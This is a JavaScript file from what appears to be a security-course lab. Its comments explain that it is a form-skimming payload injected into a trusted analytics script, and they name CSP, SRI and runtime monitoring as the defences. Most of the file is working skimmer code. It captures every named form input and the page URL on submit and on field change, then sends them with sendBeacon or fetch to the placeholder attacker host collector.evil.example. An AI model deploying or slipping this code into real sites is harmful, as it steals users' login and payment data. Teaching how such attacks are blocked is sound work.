// static/skimmer.js — EDUCATIONAL DEMONSTRATION ONLY (W3 Ch8)
//
// This is the payload attacks/round3_skimmer.py appends to the trusted
// analytics-helper.js. It is what a real form-skimmer does: listen for input on
// the checkout/login fields and POST the captured values to an attacker origin,
// in parallel with the honest submit. The user sees nothing; the TLS to the
// real server is untouched. It runs only against your own local lab store.
//
// Defenses that stop it (Round 3): CSP connect-src 'self' makes the browser
// REFUSE the cross-origin POST (and fire a report); SRI would have caught the
// tampered file if it were included with an integrity hash; runtime_monitor.js
// reports the attempt. CSP is the control that actually blocks exfiltration.
(function () {
  "use strict";
  var EXFIL = "https://collector.evil.example/collect";
  function steal() {
    var data = {};
    document.querySelectorAll("input").forEach(function (el) {
      if (el.name) data[el.name] = el.value;
    });
    data.url = location.href;
    // Cross-origin exfil: blocked by CSP connect-src at L7, reported either way.
    try {
      navigator.sendBeacon(EXFIL, JSON.stringify(data));
    } catch (e) {
      fetch(EXFIL, { method: "POST", body: JSON.stringify(data), mode: "no-cors" });
    }
  }
  document.addEventListener("submit", steal, true);
  document.addEventListener("change", steal, true);
})();
